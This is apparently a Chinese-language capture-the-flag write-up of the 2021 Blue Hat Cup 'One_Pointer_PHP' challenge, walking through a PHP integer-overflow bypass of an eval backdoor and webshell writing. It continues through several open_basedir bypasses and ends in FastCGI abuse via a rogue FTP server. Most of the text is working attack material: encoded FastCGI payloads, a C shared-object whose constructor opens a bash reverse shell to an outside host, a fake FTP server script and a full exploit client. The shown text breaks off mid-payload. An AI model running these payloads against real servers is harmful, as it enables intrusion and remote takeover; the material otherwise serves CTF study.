%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/ip/8888%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 利用如下恶意文件在我们vps开启ftp服务 import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('0.0.0.0', 23)) s.listen(1) conn, addr = s.accept() conn.send(b'220 welcome ') #Service ready for new user. #Client send anonymous username #USER anonymous conn.send(b'331 Please specify the password. ') #User name okay, need password. #Client send anonymous password. #PASS anonymous conn.send(b'230 Login successful. ') #User logged in, proceed. Logged out if appropriate. #TYPE I conn.send(b'200 Switching to Binary mode. ') #Size / conn.send(b'550 Could not get the file size. ') #EPSV (1) conn.send(b'150 ok ') #PASV conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000) ') #STOR / (2) conn.send(b'150 Permission denied. ') #QUIT conn.send(b'221 Goodbye. ') conn.close() 这里由于在我们真正想让其请求之前只传给过url，那只需要编码一次即可，最后在vps上开启ftp服务，还有监听端口（注意开放端口），接着向url传入如下： 注意这里的data我在url进行get传参了，如下图成功拿到flag 蓝帽杯_2021_One_Pointer_PHP 发现这道题考点还是很多的，我几乎都没见过。。。。 首先题目给了两个文件 #add_api.php &lt;?php include \"user.php\"; if($user=unserialize($_COOKIE[\"data\"])){ $count[++$user-&gt;count]=1; if($count[]=1){ $user-&gt;count+=1; setcookie(\"data\",serialize($user)); }else{ eval($_GET[\"backdoor\"]); } }else{ $user=new User; $user-&gt;count=1; setcookie(\"data\",serialize($user)); } ?&gt; #user.php &lt;?php class User{ public $count; } ?&gt; 这里说只有$count[]=1不成立的时候我们才能进行eval命令执行，但这里明显是赋值为1，肯定恒为true，所以不知道如何绕过了。看了wp发现是利用PHP数组溢出，具体可以参考：PHP数组的key溢出问题 --但这个原理分析的我认为和如何绕过并无太大关系，随后继续翻文章终于找到一个完美的解释： 我们翻阅官方文档可以发现：PHP数组 其对数组的键值做了以下解释： key 为可选项。如果未指定，PHP 将自动使用之前用过的最大 integer 键名加上 1 作为新的键名。 如果给出方括号但没有指定键名，则取当前最大 int 索引值，新的键名将是该值加上 1（但是最小为 0）。如果当前还没有 int 索引，则键名将为 0 。 进行一个简单测试，如下图可以看到键值在逐渐自增，那这样的话就很容易联系到PHP数组溢出了 在上述文章中也说到： 我们可以看到当key值比较小是没有问题，当key值很大时输出的值溢出了，临界点是9223372036854775807这个数字。 也就是大于这个临界点的话，就会报错，我们再简单测试一番，如下图可以看到此时爆出警告，且最终打印出来的为NULL，这意味着我们可以绕过了 但由于下图中这一步的自增，我们需要给count赋值为临界点-1 &lt;?php class User { public $count; } $pop = new User(); $pop-&gt;count = 9223372036854775806; echo urlencode(serialize($pop)); ?&gt; 将得到的数值传给cookie的data，同时backdoor读取phpinfo 如上图，成功绕过，且我们也看到了熟悉的FastCGI服务，不过我们还是跟着做题思路走，毕竟我们这是事后诸葛亮。那这里我们成功绕过，之后肯定想着利用eval进行命令执行，但在此之前我们需要得知其禁用了哪些函数 可以看到你用的很多，但是可以发现没有禁用file_get_content/put等文件读取函数这说明我们可以尝试用put进行木马写入 ?backdoor=file_put_content('shell.php', '&lt;?php @eval($_POST[1]);?&gt;'); 这里面我写入之后也页面测试的好好的，但蚁剑就是死活连不上，结果浪费了两个小时，发现tm又是校园网的原因。。。。。。。。真搞心态！最后换了热点发现成功，随后看了根目录等等，但都发现文件里面没有东西 那我们在研究一下是否phpinfo漏掉了什么东西，如下图这里面含有open_basedir，简单了解一下该函数的作用 在p神的总结下，那就是：open_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件的读、写的函数都会经过它的检查，Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。–也就是对应这道题，我们只能读写/var/www/html目录中的文件。 设置open_basedir的方法，在linux下，不同的目录由“:”分割，如“/var/www/:/tmp/”；在Windows下不同目录由“;”分割，如“c:/www;c:/windows/temp”。 这里p神也说了绕过open_basedir之后几乎是用来进行目录的列举与遍历，而并非具体的文件读写，因为在php5.3以后很少有能够绕过open_basedir读写文件的方法。懒得再开文章了，索性就在这里持续学习了。这里我们根据p神的文章来学习一波如何绕过open_basedir。 open_basedir绕过 DirectoryIterator + Glob 列举目录 DirectoryIterator是PHP 5之后添加的一个类，为用户提供一个简单的查看目录的接口。而glob：数据流包装器是从PHP 5.3.0开始有效的，用来查找匹配的文件路径。 上payload： &lt;?php // 输出当前PHP配置中的open_basedir值，open_basedir限制脚本只能访问指定的目录及其子目录。 printf('&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir')); // 创建一个空数组，用于存储文件列表。 $file_list = array(); // DirectoryIterator是PHP的内置类，可以用于遍历文件夹和文件 // 代码中使用glob:///*来列出由glob函数支持的所有匹配的文件。 $it = new DirectoryIterator(\"glob:///*\"); // 遍历DirectoryIterator返回的每个文件（文件名） foreach($it as $f) { // 将文件名添加到$file_list数组中，$f-&gt;__toString()返回当前遍历到的文件的路径名。 $file_list[] = $f-&gt;__toString(); } //这次是为了遍历隐藏文件（以.开头的特殊文件）。同样也使用了glob://协议。 $it = new DirectoryIterator(\"glob:///.*\"); //同理 foreach($it as $f) { $file_list[] = $f-&gt;__toString(); } //进行文件名的排序，为了美观 sort($file_list); //输出得到的所有文件 foreach($file_list as $f){ echo \"{$f}&lt;br/&gt;\"; } ?&gt; 这里跟着GPT学习一波上述代码的逻辑，这里懒得配环境了，就直接借用p神的了~~~ 执行我们可以发现，open_basedir为/usr/share/nginx/www/:/tmp/，但我们成功列举了/根目录下的所有文件： 不过这里的测试是在linux环境下才可以的，并且还有一个缺点就是要求php版本为5.3以上，但p神又说5.5/5.6可能有修复，但还没看到。。。这里先不管了 realpath列举目录 这个realpath函数是php中将一个路径规范化成为绝对路径的方法，它可以去掉多余的…/或./等跳转字符，能将相对路径转换成绝对路径。 在开启了open_basedir以后，这个函数有个特点：当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录），但该文件（目录）是存在的话，他将抛出错误（File is not within the allowed path(s)）。 那这很明显了，我们只需要判断报错信息，就可以得到该文件是否存在了，也就是暴力破解，这个错误信息用err_handle()函数捕捉：当猜解某个存在的文件时，会因抛出错误而进入err_handle()，当猜解某个不存在的文件时，将不会进入err_handle()。 但缺点就是效率太低，上千万次才可以跑完，这肯定不行的，但p神这时候就想到了windows下的通配符：&lt;、&gt; 这里就懵逼了，windows下通配符不是?、*吗，这两个符号是什么鬼，随后看到评论区p神让我们看看这个漏洞 wooyun-2014-071540 上述标记处他打错了，这里说在php+windows+iis环境下这两个符号可以等价于通配符，嗷吼，怪不得，payload如下 &lt;?php ini_set('open_basedir', dirname(__FILE__));//获取php.ini中的open_basedir信息 printf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir'));//将其遍历打印出来 set_error_handler('isexists'); $dir = 'd:/test/'; $file = ''; $chars = 'abcdefghijklmnopqrstuvwxyz0123456789_'; for ($i=0; $i &lt; strlen($chars); $i++) { $file = $dir . $chars[$i] . '&lt;&gt;&lt;'; realpath($file);//将所有自定义得到的文件绝对路径传入到其中，它会根据是否存在而选择报错与否，紧接着就会触发isexists } function isexists($errno, $errstr) { $regexp = '/File\\((.*)\\) is not within/';//匹配File xxx is not within的文本 preg_match($regexp, $errstr, $matches); if (isset($matches[1])) { printf(\"%s &lt;br/&gt;\", $matches[1]);//如果匹配到则将匹配到的内容打印出来 } } ?&gt; 执行可以看到： Open_basedir为c:\\wamp\\www，但我们列举出了d:/test/目录下的文件，不过只能列举出首字母不同的文件，首字母相同的话，就需要添加第二个字符再接着枚举、第三个字符etc… 这个方法好处是windows下php所有版本通用，当然坏处就是只有windows下才能使用通配符，如果是linux下就只能暴力猜解了。 SplFileInfo::getRealPath列举目录 这时p神又在想，如果我们的realpath被ban了该如何，随后他在PHP5.1.2之后找到了一个新引入的类，SplFileInfo，其提供一个对文件进行操作的接口，其中有一个getRealPath方法与realpath很像，都是获取绝对路径用的。但区别点在于这个getRealPath方法是完全无视open_basedir存在的，当我们传入一个不存在的路径时，会返回false，当该路径存在时，他会直接返回正常的绝对路径，接下来看p神的poc： &lt;?php ini_set('open_basedir', dirname(__FILE__)); printf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir')); $basedir = 'D:/test/'; $arr = array(); $chars = 'abcdefghijklmnopqrstuvwxyz0123456789'; for ($i=0; $i &lt; strlen($chars); $i++) { $info = new SplFileInfo($basedir . $chars[$i] . '&lt;&gt;&lt;');//将构造的路径传入该类，并实例化 $re = $info-&gt;getRealPath();//调用getrealpath方法，尝试获取绝对路径 if ($re) { dump($re);//如果存在，则转到dump函数进行处理 } } function dump($s){ echo $s . '&lt;br/&gt;';//输出得到的文件绝对路径 ob_flush(); flush(); } ?&gt; 这里附上对ob_flush()与flush()的解释： 这个 dump 函数可能主要用于调试目的，当开发者想要得到实时输出并即时观察脚本执行信息时。在脚本执行期间，输出通常会缓存起来，直到达到一定量或脚本执行完毕后一次性发送到浏览器。通过使用 ob_flush() 和 flush()，开发者可以强制立即输出数据，这对于监视长时间运行的脚本非常有用。 同样可以列举，这个方法有个特点，不管是否开启open_basedir都是可以枚举任意目录的。而上一个方法（realpath）只有在开启open_basedir且在open_basedir外的时候才会报错，才能列举目录。当然，没有开启open_basedir的时候也不需要这样列举目录了。 GD库imageftbbox/imagefttext列举目录 GD库一般是PHP必备的拓展库之一，这里我们看p神的分析： 我拿imageftbbox举个例子，这个函数第三个参数是字体的路径。我发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误。 这很清晰了，特点类似于realpath，看poc： &lt;?php ini_set('open_basedir', dirname(__FILE__)); printf(\"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;\", ini_get('open_basedir')); set_error_handler('isexists'); $dir = 'd:/test/'; $file = ''; $chars = 'abcdefghijklmnopqrstuvwxyz0123456789_'; for ($i=0; $i &lt; strlen($chars); $i++) { $file = $dir . $chars[$i] . '&lt;&gt;&lt;'; //$m = imagecreatefrompng(\"zip.png\"); //imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, 'aaa'); imageftbbox(100, 100, $file, 'aaa');//将构造的文件路径传给imageftbbox方法，出错的话则会调用isexists方法 } function isexists($errno, $errstr) { global $file; if (stripos($errstr, 'Invalid font filename') === FALSE) { printf(\"%s&lt;br/&gt;\", $file);//如果报错信息不是Invalid font filename的话，则输入文件路径 } } ?&gt; 我们可以看到成功爆出，但却只能爆出一个字符，但注意的是这里的特殊通配符是起了作用的，只不过在最终输出的时候通配符并没有转换为相应的字符。因此这种方法比realpath麻烦的点在于，需要一位一位爆破。 bindtextdomain暴力猜解目录 先看p神的分析： bindtextdomain是php下绑定domain到某个目录的函数。具体这个domain是什么我也没具体用过，只是在一些l10n应用中可能用到的方法（相关函数textdomain、gettext、setlocale，说明：http://php.net/manual/en/function.gettext.php） Bindtextdomain函数在环境支持Gettext Functions的时候才能使用，而我的windows环境下是没有bindtextdomain函数的，我的linux环境是默认存在这个函数。 这个函数的特点在于第二个参数directory，如果文件路径存在则返回具体的路径，不存在则返回false，poc如下 &lt;?php printf('&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir')); $re = bindtextdomain('xxx', $_GET['dir']); var_dump($re); ?&gt; 这里可以看到依旧可以绕过open_basedir，缺点在于只能在linux环境下才可以，但在linux下又不能使用通配符来猜解目录，所以这是一个没有办法的办法。。。。 这里附上linux下又不能使用通配符来猜解目录的原因： 在Linux系统中，通过正常的shell环境中使用通配符（如 * 和 ?）来进行文件匹配和简单的模式匹配通常是可行的。然而，通配符通常不用于“猜解”（或称枚举）目录，因为shell通配符的匹配规则并不支持猜解目录结构中未知的部分。 例如，* 可用于匹配任意数量的字符，而 ? 可匹配任意单个字符。这些通配符可以匹配已知模式的文件和目录名称，但它们无法用来发现系统上未知或隐藏的目录。也就是说，你不能通过它们来猜解由未知字符组成的目录名称。 ?backdoor=file_put_contents('basedir.php', '&lt;?php printf(\\'&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;\\', ini_get(\\'open_basedir\\'));$file_list = array();$it = new DirectoryIterator(\"glob:///*\");foreach ($it as $f) {$file_list[] = $f-&gt;__toString();}$it = new DirectoryIterator(\"glob:///.*\");foreach($it as $f) {$file_list[] = $f-&gt;__toString();}sort($file_list);foreach ($file_list as $f) {echo \"{$f}&lt;br/&gt;\";}?&gt;'); 这里我们可以通过p神的第一个glob协议的办法来绕过，这里我是在靶机页面传入的poc有点麻烦还需要注意符号的转义，大家可以蚁剑连接在html下写入文件即可，因此html下是可以进行读写的。 如上图看到了根目录下存在flag，那接下来就是读取了，但我们如何绕过disable_functions呢，又是一个没学过的姿势。。。。发现这个题目没学过的知识还是很多的，我依旧需要另起文章去学习，那接下来我们先复现完整这个题目再说，有点走远了。。。。 总的来说我们想要读取文件的话，就是需要对open_basedir进行修改，但如何修改呢，这里我直接上payload，原理会在其他文章学一下（不过看了看原理，是PHP底层的。。。） mkdir('sub');chdir('sub');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/')); 通过如上payload我们可以重新设置open_basedir对其进行覆盖 如图可以列举出目录，接下来依旧是读取，那就是file_get_contents函数了，但我们已经测试过这是行不通的，看了wp说是这里是权限不够，需要提权，但如何提权呢（我也不知道~~~），这里师傅们说可以通过加载恶意so文件，但如何加载呢，这里就需要回到最初我们看到的FastCGI了，既然开启了FastCGI那我们就可以通过开启恶意ftp服务，让靶机来访问我们的服务，最终将恶意so文件上传到靶机。 mkdir('sub');chdir('sub');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents('/usr/local/etc/php/php.ini')); 如上图这里应该是说明可以进行加载.so文件，那我们可以构造恶意的.so文件进去，接下来就是读取关于FastCGI服务的一些配置信息了/etc/nginx 读取nginx.conf，发现如下两个可以路径，我们先看看sites 成功在/etc/nginx/sites-enabled/default读取到详细信息 server { listen 80 default_server; listen [::]:80 default_server; # SSL configuration # # listen 443 ssl default_server; # listen [::]:443 ssl default_server; # # Note: You should disable gzip for SSL traffic. # See: https://bugs.debian.org/773332 # # Read up on ssl_ciphers to ensure a secure configuration. # See: https://bugs.debian.org/765782 # # Self signed certs generated by the ssl-cert package # Don't use them in a production server! # # include snippets/snakeoil.conf; root /var/www/html; # Add index.php to the list if you are using PHP index index.php index.html index.htm index.nginx-debian.html; server_name _; location / { # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ =404; } # pass PHP scripts to FastCGI server # location ~ \\.php$ { root html; fastcgi_pass 127.0.0.1:9001; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/html/$fastcgi_script_name; include fastcgi_params; } # deny access to .htaccess files, if Apache's document root # concurs with nginx's one # #location ~ /\\.ht { #\tdeny all; #} } 这里看到其FastCGI开在了9001端口，接下来就是写恶意ftp服务了，写之前先准备好.so文件（下面看的wp） //首先使用以下c文件 hpdoger.c 编译一个恶意的 .so 扩展，这里直接用网上亘古不变的写法： #define _GNU_SOURCE #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; __attribute__ ((__constructor__)) void preload (void){ system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1'\"); } 通过 shared 命令编译： gcc hpdoger.c -fPIC -shared -o hpdoger.so 之后上传到靶机的html目录下即可 这里使用的wget下载 构造FastCGI请求PHP-CGI 这里用gopherus的话还需要修改很多东西，因此直接修改exp了：fcgi_jailbreak.php &lt;?php /** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. */ /** * Handles communication with a FastCGI application * * @author Pierrick Charron &lt;pierrick@webstart.fr&gt; * @version 1.0 */ class FCGIClient { const VERSION_1 = 1; const BEGIN_REQUEST = 1; const ABORT_REQUEST = 2; const END_REQUEST = 3; const PARAMS = 4; const STDIN = 5; const STDOUT = 6; const STDERR = 7; const DATA = 8; const GET_VALUES = 9; const GET_VALUES_RESULT = 10; const UNKNOWN_TYPE = 11; const MAXTYPE = self::UNKNOWN_TYPE; const RESPONDER = 1; const AUTHORIZER = 2; const FILTER = 3; const REQUEST_COMPLETE = 0; const CANT_MPX_CONN = 1; const OVERLOADED = 2; const UNKNOWN_ROLE = 3; const MAX_CONNS = 'MAX_CONNS'; const MAX_REQS = 'MAX_REQS'; const MPXS_CONNS = 'MPXS_CONNS'; const HEADER_LEN = 8; /** * Socket * @var Resource */ private $_sock = null; /** * Host * @var String */ private $_host = null; /** * Port * @var Integer */ private $_port = null; /** * Keep Alive * @var Boolean */ private $_keepAlive = false; /** * Constructor * * @param String $host Host of the FastCGI application * @param Integer $port Port of the FastCGI application */ public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket { $this-&gt;_host = $host; $this-&gt;_port = $port; } /** * Define whether or not the FastCGI application should keep the connection * alive at the end of a request * * @param Boolean $b true if the connection should stay alive, false otherwise */ public function setKeepAlive($b) { $this-&gt;_keepAlive = (boolean)$b; if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) { fclose($this-&gt;_sock); } } /** * Get the keep alive status * * @return Boolean true if the connection should stay alive, false otherwise */ public function getKeepAlive() { return $this-&gt;_keepAlive; } /** * Create a connection to the FastCGI application */ private function connect() { if (!$this-&gt;_sock) { //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5); $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5); if (!$this-&gt;_sock) { throw new Exception('Unable to connect to FastCGI application'); } } } /** * Build a FastCGI packet * * @param Integer $type Type of the packet * @param String $content Content of the packet * @param Integer $requestId RequestId */ private function buildPacket($type, $content, $requestId = 1) { $clen = strlen($content); return chr(self::VERSION_1) /* version */ . chr($type) /* type */ . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */ . chr($requestId &amp; 0xFF) /* requestIdB0 */ . chr(($clen &gt;&gt; 8 ) &amp; 0xFF) /* contentLengthB1 */ . chr($clen &amp; 0xFF) /* contentLengthB0 */ . chr(0) /* paddingLength */ . chr(0) /* reserved */ . $content; /* content */ } /** * Build an FastCGI Name value pair * * @param String $name Name * @param String $value Value * @return String FastCGI Name value pair */ private function buildNvpair($name, $value) { $nlen = strlen($name); $vlen = strlen($value); if ($nlen &lt; 128) { /* nameLengthB0 */ $nvpair = chr($nlen); } else { /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */ $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF); } if ($vlen &lt; 128) { /* valueLengthB0 */ $nvpair .= chr($vlen); } else { /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */ $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF); } /* nameData &amp; valueData */ return $nvpair . $name . $value; } /** * Read a set of FastCGI Name value pairs * * @param String $data Data containing the set of FastCGI NVPair * @return array of NVPair */ private function readNvpair($data, $length = null) { $array = array(); if ($length === null) { $length = strlen($data); } $p = 0; while ($p != $length) { $nlen = ord($data{$p++}); if ($nlen &gt;= 128) { $nlen = ($nlen &amp; 0x7F &lt;&lt; 24); $nlen |= (ord($data{$p++}) &lt;&lt; 16); $nlen |= (ord($data{$p++}) &lt;&lt; 8); $nlen |= (ord($data{$p++})); } $vlen = ord($data{$p++}); if ($vlen &gt;= 128) { $vlen = ($nlen &amp; 0x7F &lt;&lt; 24); $vlen |= (ord($data{$p++}) &lt;&lt; 16); $vlen |= (ord($data{$p++}) &lt;&lt; 8); $vlen |= (ord($data{$p++})); } $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen); $p += ($nlen + $vlen); } return $array; } /** * Decode a FastCGI Packet * * @param String $data String containing all the packet * @return array */ private function decodePacketHeader($data) { $ret = array(); $ret['version'] = ord($data{0}); $ret['type'] = ord($data{1}); $ret['requestId'] = (ord($data{2}) &lt;&lt; 8) + ord($data{3}); $ret['contentLength'] = (ord($data{4}) &lt;&lt; 8) + ord($data{5}); $ret['paddingLength'] = ord($data{6}); $ret['reserved'] = ord($data{7}); return $ret; } /** * Read a FastCGI Packet * * @return array */ private function readPacket() { if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) { $resp = $this-&gt;decodePacketHeader($packet); $resp['content'] = ''; if ($resp['contentLength']) { $len = $resp['contentLength']; while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) { $len -= strlen($buf); $resp['content'] .= $buf; } } if ($resp['paddingLength']) { $buf=fread($this-&gt;_sock, $resp['paddingLength']); } return $resp; } else { return false; } } /** * Get Informations on the FastCGI application * * @param array $requestedInfo information to retrieve * @return array */ public function getValues(array $requestedInfo) { $this-&gt;connect(); $request = ''; foreach ($requestedInfo as $info) { $request .= $this-&gt;buildNvpair($info, ''); } fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0)); $resp = $this-&gt;readPacket(); if ($resp['type'] == self::GET_VALUES_RESULT) { return $this-&gt;readNvpair($resp['content'], $resp['length']); } else { throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT'); } } /** * Execute a request to the FastCGI application * * @param array $params Array of parameters * @param String $stdin Content * @return String */ public function request(array $params, $stdin) { $response = ''; // $this-&gt;connect(); $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5)); $paramsRequest = ''; foreach ($params as $key =&gt; $value) { $paramsRequest .= $this-&gt;buildNvpair($key, $value); } if ($paramsRequest) { $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest); } $request .= $this-&gt;buildPacket(self::PARAMS, ''); if ($stdin) { $request .= $this-&gt;buildPacket(self::STDIN, $stdin); } $request .= $this-&gt;buildPacket(self::STDIN, ''); echo('data='.urlencode($request)); // fwrite($this-&gt;_sock, $request); // do { // $resp = $this-&gt;readPacket(); // if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) { // $response .= $resp['content']; // } // } while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST); // var_dump($resp); // if (!is_array($resp)) { // throw new Exception('Bad request'); // } // switch (ord($resp['content']{4})) { // case self::CANT_MPX_CONN: // throw new Exception('This app can\\'t multiplex [CANT_MPX_CONN]'); // break; // case self::OVERLOADED: // throw new Exception('New request rejected; too busy [OVERLOADED]'); // break; // case self::UNKNOWN_ROLE: // throw new Exception('Role value not known [UNKNOWN_ROLE]'); // break; // case self::REQUEST_COMPLETE: // return $response; // } } } ?&gt; &lt;?php // real exploit start here //if (!isset($_REQUEST['cmd'])) { // die(\"Check your input \"); //} //if (!isset($_REQUEST['filepath'])) { // $filepath = __FILE__; //}else{ // $filepath = $_REQUEST['filepath']; //} $filepath = \"/var/www/html/add_api.php\"; // 目标主机已知的PHP文件的路径 $req = '/'.basename($filepath); $uri = $req .'?'.'command=whoami'; // 啥也不是, 不用管 $client = new FCGIClient(\"unix:///var/run/php-fpm.sock\", -1); $code = \"&lt;?php system(\\$_REQUEST['command']); phpinfo(); ?&gt;\"; // 啥也不是, 不用管 $php_value = \"unserialize_callback_func = system extension_dir = /var/www/html extension = hpdoger.so disable_classes = disable_functions = allow_url_include = On open_basedir = / auto_prepend_file = \";//extension_dir即为.so文件所在目录 $params = array( 'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0', 'REQUEST_METHOD' =&gt; 'POST', 'SCRIPT_FILENAME' =&gt; $filepath, 'SCRIPT_NAME' =&gt; $req, 'QUERY_STRING' =&gt; 'command=whoami', 'REQUEST_URI' =&gt; $uri, 'DOCUMENT_URI' =&gt; $req, #'DOCUMENT_ROOT' =&gt; '/', 'PHP_VALUE' =&gt; $php_value, 'SERVER_SOFTWARE' =&gt; '80sec/wofeiwo', 'REMOTE_ADDR' =&gt; '127.0.0.1', 'REMOTE_PORT' =&gt; '9001', //FastCGI开启的服务端口地 'SERVER_ADDR' =&gt; '127.0.0.1', 'SERVER_PORT' =&gt; '80', 'SERVER_NAME' =&gt; 'localhost', 'SERVER_PROTOCOL' =&gt; 'HTTP/1.1', 'CONTENT_LENGTH' =&gt; strlen($code) ); // print_r($_REQUEST); // print_r($params); //echo \"Call: $uri \"; echo $client-&gt;request($params, $code).\" \"; ?&gt; 通过在FastCGI协议修改PHP_VALUE字段进而修改php.ini中的一些设置，而open_basedir 同样可以通过此种方法进行设置。比如：$php_value = \"open_basedir = /\"; 因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir 编译得到payload data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02H%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fww w%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.p hp%09%80%00%00%BCPHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_func tions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT900 1%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00 然后执行以下脚本自己 vps 上搭建一个恶意的 ftp 服务器： import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('0.0.0.0', 23)) s.listen(1) conn, addr = s.accept() conn.send(b'220 welcome ') #Service ready for new user. #Client send anonymous username #USER anonymous conn.send(b'331 Please specify the password. ') #User name okay, need password. #Client send anonymous password. #PASS anonymous conn.send(b'230 Login successful. ') #User logged in, proceed. Logged out if appropriate. #TYPE I conn.send(b'200 Switching to Binary mode. ') #Size / conn.send(b'550 Could not get the file size. ') #EPSV (1) conn.send(b'150 ok ') #PASV conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9001) ') #STOR / (2) conn.send(b'150 Permission denied. ') #QUIT conn.send(b'221 Goodbye. ') conn.close() 随后在vps上开启上述ftp服务，并且开一个端口进行监听 最后用一个eval构造恶意代码file_put_contents，与我们的vps的ftp建立连接 /add_api.php?backdoor=$file=$_GET['file'];$data=$_GET['data'];file_put_contents($file,$data);&amp;file=ftp://aaa@124.220.233.26:23/123&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2F www%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api .php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+% 